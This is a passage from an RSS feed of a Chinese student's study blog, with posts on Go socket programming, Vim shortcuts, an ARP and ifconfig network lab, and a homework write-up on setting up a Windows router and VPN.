      <link>//localhost:64783/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Sat, 11 Nov 2023 12:47:47 +0800</pubDate>
      <guid>//localhost:64783/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h2 id=&#34;11-理解网络和套接字&#34;&gt;1.1 理解网络和套接字&lt;/h2&gt;&#xA;&lt;h3 id=&#34;套接字&#34;&gt;套接字&lt;/h3&gt;&#xA;&lt;p&gt;套接字（socket）是计算机网络中进程间通信的一种机制，它将进程间通信抽象为一个端点，该端点由一个IP地址和一个端口号来标识。&#xA;套接字是网络数据传输用的软件设备。网络编程又称为套接字编程。&lt;/p&gt;&#xA;&lt;h4 id=&#34;编写-hello-world--服-务-器-端&#34;&gt;编写&amp;quot; Hello world! &amp;quot; 服 务 器 端&lt;/h4&gt;&#xA;&lt;p&gt;网络编程中接受连接请求的套接字创建过程可整理如下。&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;第一步:调用s o c k e t 函数创建套接字。&lt;/li&gt;&#xA;&lt;li&gt;第二步:调用b i n d 函数分配E地址和端口号。&lt;/li&gt;&#xA;&lt;li&gt;第三步:调用l i s t e n 函数转为可接收请求状态。&lt;/li&gt;&#xA;&lt;li&gt;第四步:调用a c c e p t 函数受理连接请求。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;hello_server.go&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;net&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;os&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//检查参数&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: %s &amp;lt;port&amp;gt;\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//设置监听端口和信息&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello world!&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//当你调用 net.Listen(&amp;#34;tcp&amp;#34;, &amp;#34;:&amp;#34;+port) 时，Go 会执行以下操作：&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//1.创建一个 TCP 套接字。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//2.将套接字绑定到指定的 IP 地址和端口号。&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//3.将套接字转为可接收连接状态&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;listener&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;net&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Listen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;socket() error: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//延迟关闭监听&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;listener&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//循环监听&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//4.Accept()接收连接&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;listener&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;accept() error: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#75715e&#34;&gt;//5.write()发送信息&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Write&lt;/span&gt;([]byte(&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;))&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;write() error: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;&#x9;&lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#x9;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;client&#34;&gt;client&lt;/h4&gt;&#xA;&lt;p&gt;创建套接字,但此时套接字并不马上分为服务器端和客户端。如果紧接着调用bind和listen函数,将成为&lt;strong&gt;服务器端套接字&lt;/strong&gt;;如果调用connect函数将成为客户端套接字。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Vim</title>
      <link>//localhost:64783/posts/vim/</link>
      <pubDate>Fri, 10 Nov 2023 12:43:42 +0800</pubDate>
      <guid>//localhost:64783/posts/vim/</guid>
      <description>&lt;p&gt;尝试学习一下vim&lt;/p&gt;&#xA;&lt;h2 id=&#34;vim模式切换&#34;&gt;vim模式切换&lt;/h2&gt;&#xA;&lt;h3 id=&#34;normal转insert&#34;&gt;normal转insert&lt;/h3&gt;&#xA;&lt;p&gt;i 光标前插入&#xA;I行首插入&#xA;o进入下一行输入&#xA;O上一行插入&#xA;a光标之后输入&#xA;A行末尾插入&lt;/p&gt;&#xA;&lt;h3 id=&#34;insert-转normal&#34;&gt;insert 转normal&lt;/h3&gt;&#xA;&lt;p&gt;esc/jj 变回普通模式&lt;/p&gt;&#xA;&lt;h3 id=&#34;normal转visual&#34;&gt;normal转visual&lt;/h3&gt;&#xA;&lt;p&gt;v变成可视模式（无法编辑）&lt;/p&gt;&#xA;&lt;h3 id=&#34;visual转nomal&#34;&gt;visual转nomal&lt;/h3&gt;&#xA;&lt;p&gt;esc或者v变回普通模式&lt;/p&gt;&#xA;&lt;h3 id=&#34;普通模式转命令模式&#34;&gt;普通模式转命令模式&lt;/h3&gt;&#xA;&lt;p&gt;：转成命令模式&lt;/p&gt;&#xA;&lt;h3 id=&#34;命令模式转普通模式&#34;&gt;命令模式转普通模式&lt;/h3&gt;&#xA;&lt;p&gt;esc&lt;/p&gt;&#xA;&lt;h2 id=&#34;光标移动&#34;&gt;光标移动&lt;/h2&gt;&#xA;&lt;h3 id=&#34;普通模式下光标移动&#34;&gt;普通模式下光标移动&lt;/h3&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.361dhwguy24g.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.6l1znm0xt3i8.webp&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.4z95f8a62f7k.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.8z6bkk52b08.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;动作-motion&#34;&gt;动作 motion&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.3l3imza42lts.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;操作符&#34;&gt;操作符&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.4zwaffdpozk0.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;删除全部 die&#xA;复制全部 yie&#xA;u 撤销&lt;/p&gt;&#xA;&lt;h2 id=&#34;大小写&#34;&gt;大小写&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.6dgggu7lgdxc.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;常用&#34;&gt;常用&lt;/h2&gt;&#xA;&lt;p&gt;gd 查看函数定义&#xA;^O返回&#xA;g数字 切换标签/ctrl+数字&#xA;command+0 到文件夹 o打开 回车修改名字&lt;/p&gt;&#xA;&lt;h2 id=&#34;easymotion&#34;&gt;easymotion&lt;/h2&gt;&#xA;&lt;p&gt;空格空格s + 要查询的字幕&#xA;空格空格+e&#xA;空格空格+w&lt;/p&gt;&#xA;&lt;h2 id=&#34;vim-surround&#34;&gt;vim surround&lt;/h2&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.2d1gjkuofvls.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;光标转移到终端&#34;&gt;光标转移到终端&lt;/h2&gt;&#xA;&lt;p&gt;leader + t&lt;/p&gt;&#xA;&lt;h2 id=&#34;切换tab&#34;&gt;切换tab&lt;/h2&gt;&#xA;&lt;p&gt;gt或gT&lt;/p&gt;</description>
    </item>
    <item>
      <title>信网实验1</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C1/</link>
      <pubDate>Tue, 07 Nov 2023 12:46:21 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C1/</guid>
      <description>&lt;h1 id=&#34;实验内容&#34;&gt;实验内容&lt;/h1&gt;&#xA;&lt;h2 id=&#34;arp&#34;&gt;arp&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;在 HostA 和 HostB 中分别打开一个终端用于本实验。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;在 HostA 和 HostB 中分别执行命令&lt;code&gt;ifconfig ens5&lt;/code&gt;，查看并记录它们各自的IPv4 地址。执行命令 &lt;code&gt;ifconfig ens6&lt;/code&gt; 查看 IPv6 地址 (global 和 link 两种) 以及以太网接口的物理地址。&lt;/strong&gt;&#xA;&lt;strong&gt;截图：&lt;/strong&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.2dh0lur8qhkw.png&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.5s8kni5d7b7k.webp&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.2i1qwanl02dc.webp&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.37tkn71qiu4g.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;命令解释：&lt;/strong&gt;&#xA;&lt;code&gt;ifconfig&lt;/code&gt; 是一个用于配置和显示网络接口信息的命令。&lt;code&gt;ens5&lt;/code&gt; 和 &lt;code&gt;ens6&lt;/code&gt; 是网络接口的名称，通常用于表示以太网接口。&lt;code&gt;ifconfig ens5&lt;/code&gt; 命令用于显示名为 &lt;code&gt;ens5&lt;/code&gt; 的网络接口的配置信息，包括 IP 地址、子网掩码、广播地址、MAC 地址等。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;在 HostA 中执行命令 &lt;code&gt;arp -n&lt;/code&gt; 或&lt;code&gt;ip neigh show&lt;/code&gt; 查看并记录本机 ARP 缓存表的内容。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;命令解释：&lt;/strong&gt;&#xA;&lt;code&gt;arp -n&lt;/code&gt; 是一个用于查看本地ARP缓存表的命令。它会显示已解析的IP地址和对应的MAC地址。&#xA;&lt;code&gt;ip neigh show&lt;/code&gt; 是一个用于查看本地邻居表的命令。它会显示已解析的IP地址和对应的MAC地址，类似于 arp -n 命令。&#xA;arp -n 和 ip neigh show 都是用于查看本地ARP缓存表或邻居表的命令，它们的功能相似但有一些区别。&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;命令格式不同：arp -n 是在大多数操作系统中使用的命令，而 ip neigh show 是在基于 Linux 的操作系统中使用的命令。&lt;/li&gt;&#xA;&lt;li&gt;输出格式不同：arp -n 输出的结果通常是以表格形式显示的，包括IP地址和对应的MAC地址。而 ip neigh show 输出的结果可能更详细，包括IP地址、MAC地址、接口、状态等信息。&lt;/li&gt;&#xA;&lt;li&gt;支持的功能不同：ip neigh show 命令在功能上更加强大，可以显示更多关于邻居的信息，如状态、接口类型等。而 arp -n 命令通常只显示基本的IP地址和MAC地址信息。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;strong&gt;截图：&lt;/strong&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.4y3egv3n6av4.webp&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.2al8hllnncow.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>网络安全作业2</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A2/</link>
      <pubDate>Thu, 26 Oct 2023 15:51:26 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A2/</guid>
      <description>&lt;p&gt;得分：10/10&lt;/p&gt;&#xA;&lt;h2 id=&#34;路由配置&#34;&gt;路由配置&lt;/h2&gt;&#xA;&lt;h3 id=&#34;配置路由器router&#34;&gt;配置路由器Router&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;安装远程访问“角色和功能”&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.e2wqle6p7a8.png&#34; alt=&#34;image|300&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;设置IP地址和默认网关的IP地址。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.2pndmnwcyzk0.webp&#34; alt=&#34;image|300&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;启用“路由和远程访问服务”&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.3myv7r2rwdhc.webp&#34; alt=&#34;image|300&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;关闭防火墙&#xA;![[Pasted image 20231024224258.png|300]]&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;配置vpn-server&#34;&gt;配置VPN Server&lt;/h3&gt;&#xA;&lt;h4 id=&#34;路由远程访问服务器设置&#34;&gt;路由远程访问服务器设置&lt;/h4&gt;&#xA;&lt;p&gt;![[Pasted image 20231023164229.png|400]]&lt;/p&gt;&#xA;&lt;h4 id=&#34;新建用户&#34;&gt;新建用户&lt;/h4&gt;&#xA;&lt;p&gt;![[Pasted image 20231024224417.png|400]]&lt;/p&gt;&#xA;&lt;h4 id=&#34;vpn-server的ip地址配置&#34;&gt;VPN server的ip地址配置&lt;/h4&gt;&#xA;&lt;p&gt;![[Pasted image 20231024223002.png|400]]&lt;/p&gt;&#xA;&lt;h3 id=&#34;配置客户端&#34;&gt;配置客户端&lt;/h3&gt;&#xA;&lt;h4 id=&#34;client-b的ip地址&#34;&gt;client B的ip地址&lt;/h4&gt;&#xA;&lt;p&gt;将ip地址设置为192.168.86.&lt;!-- raw HTML omitted --&gt;24&lt;!-- raw HTML omitted --&gt;&#xA;24为学号末2位&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.7c8179hqfkhs.png&#34; alt=&#34;image|400&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;client-a的ip地址&#34;&gt;client A的ip地址&lt;/h2&gt;&#xA;&lt;p&gt;将ip地址设置为55.0.0.&lt;!-- raw HTML omitted --&gt;24&lt;!-- raw HTML omitted --&gt;&#xA;![[Pasted image 20231024211518.png|400]]&lt;/p&gt;&#xA;&lt;h3 id=&#34;vpn连接&#34;&gt;VPN连接&lt;/h3&gt;&#xA;&lt;p&gt;进行VPN连接&#xA;![[Pasted image 20231024223124.png|400]]&lt;/p&gt;&#xA;&lt;h4 id=&#34;连接后的ip变化&#34;&gt;连接后的IP变化&lt;/h4&gt;&#xA;&lt;h5 id=&#34;clienta&#34;&gt;clientA&lt;/h5&gt;&#xA;&lt;p&gt;![[Pasted image 20231024221917.png|400]]&lt;/p&gt;&#xA;&lt;h5 id=&#34;vpn-server&#34;&gt;VPN Server&lt;/h5&gt;&#xA;&lt;p&gt;![[Pasted image 20231024223749.png|400]]&lt;/p&gt;&#xA;&lt;h4 id=&#34;wireshark抓包&#34;&gt;wireshark抓包&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.4okcpvjoj37k.webp&#34; alt=&#34;image|400&#34;&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.24yp15joi1kw.webp&#34; alt=&#34;image|400&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>网络安全作业3</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/</link>
      <pubDate>Thu, 26 Oct 2023 10:17:18 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/</guid>
